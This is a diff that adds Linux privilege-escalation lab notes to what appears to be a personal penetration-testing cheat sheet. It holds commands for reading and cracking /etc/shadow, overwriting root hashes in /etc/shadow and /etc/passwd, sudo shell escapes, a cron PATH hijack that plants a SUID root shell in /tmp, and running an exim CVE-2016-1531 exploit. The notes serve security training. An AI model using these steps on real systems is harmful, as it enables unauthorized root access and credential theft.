@@ -103,22 +103,122 @@ But The best tool for gathering info about domain is dnsenum
 dnsenum $(domain)
 ```
 
+# linux prives
+
+## readable /etc/shadow file
+
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+Note that the /etc/shadow file on the VM is world-readable by user
+```bash
+ls -l /etc/shadow
+```
+View the contents of the /etc/shadow file:
+```bash
+cat /etc/shadow
+```
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+
+Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+Switch to the root user, using the cracked password:
+```bash
+su root
+```
+
+## Writable /etc/shadow
+
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+Note that the /etc/shadow file on the VM is world-writable:
+`ls -l /etc/shadow
+`
+Generate a new password hash with a password of your choice:
+`mkpasswd -m sha-512 newpasswordhere
+`
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+Switch to the root user, using the new password:
+`su root
+`
+
+## Writable /etc/passwd
+
+The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
+
+Note that the /etc/passwd file is world-writable:
+
+`ls -l /etc/passwd
+`
+Generate a new password hash with a password of your choice:
+
+`openssl passwd newpasswordhere
+`
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+
+Switch to the root user, using the new password:
+
+`su root`
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+
+Now switch to the newroot user, using the new password:
+
+`su newroot
+`
 
 
+## sudo shell escapes
+
+List the programs which sudo allows your user to run:
+
+`sudo -l
+`
+Visit [GTFOBins](https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+
+Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.
+
+## Cron
+
+View the contents of the system-wide crontab:
+
+`cat /etc/crontab
+`
+Note that the PATH variable starts with /home/user which is our user's home directory.
+
+Create a file called overwrite.sh in your home directory with the following contents:
+
+```bash
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+Make sure that the file is executable:
+
+```bash
+chmod +x /home/user/overwrite.sh
+```
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+```bash
+/tmp/rootbash -p
+```
 
 
+## suid
 
+Find all the SUID/SGID executables on the Debian VM:
 
+```bash
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!
 
+A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.
 
+Run the exploit script to gain a root shell:
 
-
-
-
-
-
-
-
+/home/user/tools/suid/exim/cve-2016-1531.sh
 
 
 
